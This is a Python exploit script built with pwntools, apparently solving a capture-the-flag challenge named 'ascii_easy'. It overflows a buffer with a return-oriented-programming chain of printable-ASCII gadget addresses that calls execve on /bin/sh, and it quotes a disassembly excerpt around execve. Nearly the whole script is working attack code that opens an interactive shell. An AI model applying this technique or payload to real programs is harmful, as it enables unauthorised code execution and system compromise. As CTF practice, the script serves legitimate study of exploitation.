from pwn import *
# ascii lower word => 0x[40-9e][20-7e]
"""
 0x000d8b69      8b4de0         mov ecx, dword [var_20h]
|           0x000d8b6c      89742404       mov dword [esp+0x4], esi    ; int32_t arg_10h
|           0x000d8b70      893c24         mov dword [esp], edi        ; int32_t arg_ch
|           0x000d8b73      894c2408       mov dword [esp+0x8], ecx    ; int32_t arg_14h
|           0x000d8b77      e864fafdff     call sym.execve
|           0x000d8b7c      8d65f4         lea esp, [var_ch]
"""

BASE = 0x5555e000 
pop_ecx = 0x556d2a51                    # 0x556d2a51:  pop ecx ; add al, 0xa ; ret
pop_edi_ebx =  0x555e5132               # 0x555e5132:  pop edi ; pop ebx ; ret
pop_ebx_esi =  0x55686c71               # 0x55686c71:  pop ebx ; pop esi ; ret
add_esi_ebx =  0x555c612c               # 0x555c612c:  add esi, ebx ; ret
pop_ebp = 0x5557506f                    # 0x5557506f:  pop ebp ; ret
add_edi_ecx_content =  0x556d7d39       # 0x556d7d39:  add edi, dword ptr [ecx + 0xe] ; add al, 0xc6 ; ret
call_execve = BASE + 0x000d8b69         # execve([edi],[esi],[ecx])

payload = b"A" * 0x20
# set edi = "/bin/sh"
payload += p32(pop_ecx)
payload += p32(0x556d6e7c - 0xe)
payload += p32(pop_edi_ebx)
payload += p32(BASE + 0x154020)
payload += b"A"*4
payload += p32(add_edi_ecx_content)
# set esi = NULL
payload += p32(pop_ebx_esi)
payload += p32(0x42424243)
payload += p32(0x7b7b7b7a)    
payload += p32(add_esi_ebx)
payload += p32(add_esi_ebx)
# set [ebp - 0x20] = NULL
payload += p32(pop_ebp) # esp
payload += p32(BASE + 0x00018550 + 0x20)
payload += p32(call_execve)
p = process(["./ascii_easy",payload])
p.interactive()
